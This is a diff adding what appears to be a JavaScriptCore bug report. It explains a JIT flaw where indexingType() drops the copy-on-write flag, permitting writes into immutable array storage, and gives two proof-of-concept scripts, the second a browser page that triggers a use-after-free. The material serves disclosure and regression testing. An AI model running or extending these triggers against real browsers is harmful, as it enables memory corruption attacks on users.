@@ -1,0 +1,106 @@
+<!--
+void AbstractValue::set(Graph& graph, RegisteredStructure structure)
+{
+    RELEASE_ASSERT(structure);
+    
+    m_structure = structure;
+
+    m_arrayModes = asArrayModes(structure->indexingType());
+    m_type = speculationFromStructure(structure.get());
+    m_value = JSValue();
+    
+    checkConsistency();
+    assertIsRegistered(graph);
+}
+
+It works out m_arrayModes using structure->indexingType() instead of structure->indexingMode(). As structure->indexingType() masks out the CopyOnWrite flag, which indicates that the butterfly of the array is immutable, needing copy-on-write, the wrong information about the array can be propagated. As a result, it's able to write into the immutable butterfly (JSImmutableButterfly) of a CoW array. And this can lead to UaF as 
+writing into an immutable butterfly can be used to bypass write barriers.
+
+I also noticed that the most calls to asArrayModes are using structure->indexingType(). I think that those should be fixed too.
+
+PoC:
+-->
+
+// ./jsc --useConcurrentJIT=false ~/test.js
+
+function set(arr, value) {
+    arr[0] = value;
+}
+
+function getImmutableArrayOrSet(get, value) {
+    let arr = [1];
+    if (get)
+        return arr;
+
+    set(arr, value);  // This inlinee is for having checkArray not take the paths using the structure comparison.
+    set({}, 1);
+}
+
+function main() {
+    getImmutableArrayOrSet(true);
+
+    for (let i = 0; i < 100; i++) {
+        getImmutableArrayOrSet(false, {});
+    }
+
+    let arr = getImmutableArrayOrSet(true);
+    print(arr[0] === 1);
+}
+
+main();
+
+PoC 2 (UaF):
+<script>
+
+function sleep(ms) {
+    let s = new Date();
+    while (new Date() - s < ms) {
+
+    }
+}
+
+function mark() {
+    for (let i = 0; i < 40; i++) {
+        new ArrayBuffer(1024 * 1024 * 1);
+    }
+}
+
+function set(arr, value) {
+    arr[0] = value;
+}
+
+function getImmutableArrayOrSet(get, value) {
+    let arr = [1];
+    if (get)
+        return arr;
+
+    set(arr, value);
+    set({}, 1);
+}
+
+function main() {
+    getImmutableArrayOrSet(true);
+
+    for (let i = 0; i < 10000; i++)
+        getImmutableArrayOrSet(false, {});
+
+    sleep(500);
+
+    let arr = getImmutableArrayOrSet(true);
+
+    mark();
+    getImmutableArrayOrSet(false, []);
+    mark();
+
+    setTimeout(() => {
+        try {
+            alert(arr[0]);
+        } catch (e) {
+            alert(e);
+        }
+    }, 200);
+}
+
+main();
+
+</script>
